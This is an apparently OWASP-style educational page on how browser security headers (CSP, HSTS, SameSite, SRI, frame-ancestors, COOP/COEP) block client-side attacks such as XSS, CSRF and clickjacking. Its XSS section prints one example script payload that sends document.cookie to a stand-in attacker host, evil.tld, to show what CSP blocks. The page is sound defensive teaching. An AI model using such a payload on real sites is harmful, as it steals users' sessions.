# C8: Leverage Browser Security Features - Threats Addressed

## Table of Contents
- [Threats Addressed by This Control](#threats-addressed)
- [How a Browser-Enforced Policy Helps](#how-it-helps)
- [The Threats, and the Feature That Blocks Each](#the-threats)
- [Chaining and Layering](#chaining)

## Threats Addressed by This Control

> **Framing** — this page lists the concrete client-side attacks that browser security features are designed to blunt. For each threat, the browser mechanism acts as a *defense-in-depth layer*: it blocks or contains the attack when a server-side control has failed. It is a backstop, not the primary fix—output encoding, anti-CSRF tokens, and server-side TLS are still required.

These attacks share one property: they play out **inside the victim's browser**. That is exactly where these features are enforced, which is why declaring the right headers, cookie flags, and directives turns the browser itself into the last line of defense against them.

## How a Browser-Enforced Policy Helps

```
1. A server-side control fails or is missed
   ↓   (an encoding gap, a loose CORS rule, a plaintext hop)
2. A malicious payload or request reaches the browser
   ↓   (injected <script>, framed page, cross-site request)
3. The browser checks the declared policy
   ↓   (CSP, HSTS, SameSite, frame-ancestors, SRI...)
4a. Policy present  -> the browser refuses the dangerous action  (contained)
4b. Policy absent   -> the browser does what the payload asked    (breach)
```

## The Threats, and the Feature That Blocks Each

### 1. Cross-Site Scripting (XSS)

Attacker-controlled input is reflected or stored and executes as script in the victim's page, stealing sessions or acting as the user. A strict, nonce-based CSP prevents inline and injected scripts from executing, and keeps the token out of reach via `HttpOnly` cookies.

```
# Injected by attacker
<script>fetch('//evil.tld/c?'+document.cookie)</script>

# Blocked by
Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
# no matching nonce -> script never runs; even if it did, cookie is not readable
```

**Blocked by**: CSP (script-src nonce/hash + `strict-dynamic`), `HttpOnly` cookies, and Trusted Types for DOM-XSS sinks.

### 2. DOM-Based XSS via Dangerous Sinks

Client-side JavaScript passes untrusted data into a sink such as `innerHTML` or `eval`, executing script without the server ever seeing markup. Trusted Types force such assignments through a vetted policy, causing raw strings to be rejected.

```
# Enforced by
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types default
# element.innerHTML = userInput   -> throws unless passed through a Trusted Types policy
```

**Blocked by**: Trusted Types (via CSP), reducing DOM-XSS sinks to a small, auditable set.

### 3. Clickjacking / UI Redress

A malicious site frames the application invisibly and tricks the victim into clicking hidden, sensitive controls (confirm a payment, grant a permission). Frame controls stop the page from being embedded at all.

```
# Blocked by
Content-Security-Policy: frame-ancestors 'none'
X-Frame-Options: DENY            # legacy fallback for old browsers
```

**Blocked by**: CSP `frame-ancestors` (primary) and `X-Frame-Options` (legacy).

### 4. MITM and Protocol Downgrade (SSL-strip)

On a hostile network an attacker keeps the victim on plaintext HTTP, reading or altering traffic and stealing cookies. HSTS instructs the browser to use HTTPS only, and preload closes the first-visit gap.

```
# Blocked by
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
# browser refuses http:// for the domain and upgrades automatically
```

**Blocked by**: HSTS (with `preload`), plus `Secure` cookies so tokens never traverse plaintext.

### 5. Cross-Site Request Forgery (CSRF)

A malicious page causes the victim's browser to send an authenticated state-changing request to a site where they are logged in. `SameSite` cookies stop the session credential from being attached to cross-site requests.

```
# Blocked by
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
# cross-site POST does not carry the cookie -> request is unauthenticated
```

**Blocked by**: `SameSite` cookies (defense-in-depth alongside server-side anti-CSRF tokens).

### 6. Data Injection via Third-Party Scripts (Supply Chain)

A CDN-hosted or third-party script (payment widget, analytics, tag manager) is tampered with to skim form data—the Magecart pattern. Subresource Integrity refuses a script whose hash no longer matches, and CSP `connect-src` limits exfiltration destinations.

```
# Blocked by
<script src="https://cdn.example.com/w.js"
        integrity="sha384-BASE64HASH" crossorigin="anonymous"></script>
Content-Security-Policy: script-src 'self' https://cdn.example.com; connect-src 'self'
# modified script -> hash mismatch -> browser refuses to execute it
```

**Blocked by**: Subresource Integrity, CSP `script-src`/`connect-src` allow-lists.

### 7. Mixed Content

An HTTPS page loads sub-resources over plaintext HTTP, giving a network attacker a foothold to inject or read content and undermining the page's TLS. Browsers block active mixed content, and CSP can upgrade or forbid it explicitly.

```
# Blocked by
Content-Security-Policy: upgrade-insecure-requests
# (or) block-all-mixed-content ; http:// sub-resources are upgraded or refused
```

**Blocked by**: CSP `upgrade-insecure-requests`, HSTS on the whole origin.

### 8. MIME-Sniffing to Executable Content

The browser guesses a response's type and treats an uploaded or user-controlled file as HTML or script, executing it. `nosniff` forces the declared `Content-Type` to be honored.

```
# Blocked by
X-Content-Type-Options: nosniff
# a text/plain response is never reinterpreted as text/html or JavaScript
```

**Blocked by**: `X-Content-Type-Options: nosniff`.

### 9. Cross-Origin Data Theft via Permissive CORS

A server reflects the request `Origin` and allows credentials, letting any site the victim visits read their authenticated API responses. An explicit allow-list denies unknown origins.

```
# Insecure
Access-Control-Allow-Origin: (reflected)   +  Access-Control-Allow-Credentials: true
# Secure
Access-Control-Allow-Origin: https://app.example.com   # exact allow-list, checked per request
```

**Blocked by**: strict CORS (no wildcard-with-credentials, no blind reflection).

### 10. Cross-Origin Leaks and Side Channels (XS-Leaks)

Cross-window references and shared resources let one site infer information about another (frame counts, timing, resource sizes). Cross-origin isolation headers sever those references and gate powerful APIs.

```
# Blocked by
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
```

**Blocked by**: COOP, COEP, and CORP.

### 11. Referrer / URL Leakage

The `Referer` header leaks full URLs—including tokens, session ids in query strings, and internal paths—to third parties. A referrer policy trims or suppresses it.

```
# Blocked by
Referrer-Policy: no-referrer          # or strict-origin-when-cross-origin
```

**Blocked by**: `Referrer-Policy`.

### 12. Abuse of Powerful Browser Features

Compromised or malicious content silently uses camera, microphone, geolocation, or other capabilities. A permissions policy denies features the application never uses, and `iframe sandbox` restricts embedded content.

```
# Blocked by
Permissions-Policy: camera=(), microphone=(), geolocation=()
<iframe src="..." sandbox="allow-scripts"></iframe>   # only the capabilities you grant
```

**Blocked by**: `Permissions-Policy` and `iframe sandbox`.

## Chaining and Layering

No single feature is sufficient, and each covers a distinct threat—which is why they are layered. A realistic client-side compromise defeats several weak points at once, and each declared feature removes one link:

```
Encoding gap  -> XSS payload reaches the page      (CSP nonce would block execution)
        +
Cookie readable by JS  -> session token stolen     (HttpOnly would hide it)
        +
connect-src open  -> token exfiltrated to evil.tld (connect-src 'self' would refuse)
        =  full account takeover, and every link was a feature left unset
```

> **Remember the ordering**: these features contain attacks that reached the browser because something upstream failed. Set them all—and still fix the upstream bug. They are the second barrier, never the only one.

## Key Takeaways

1. **Every threat here plays out in the browser**—which is exactly where these features are enforced.
2. **One feature per door**—CSP for XSS, HSTS for downgrade, SameSite for CSRF, SRI for supply chain, frame-ancestors for clickjacking.
3. **They contain, they do not cure**—keep the server-side fix and use the browser as a backstop.
4. **Attacks chain across weak spots**—a missing cookie flag plus an open `connect-src` turns one bug into a breach.
5. **Layer everything**—the value is in the combination, not any single header.

## Next Steps

- **[How to Implement](prevention.md)**: Turn each feature into concrete headers and configuration
- **[Examples](examples.md)**: See insecure vs. secure headers side by side
- **[Proactive Controls](/learn/proactive)**: Continue the OWASP Proactive Controls track
- **[Practice](/practice)**: Block these attacks with browser features hands-on
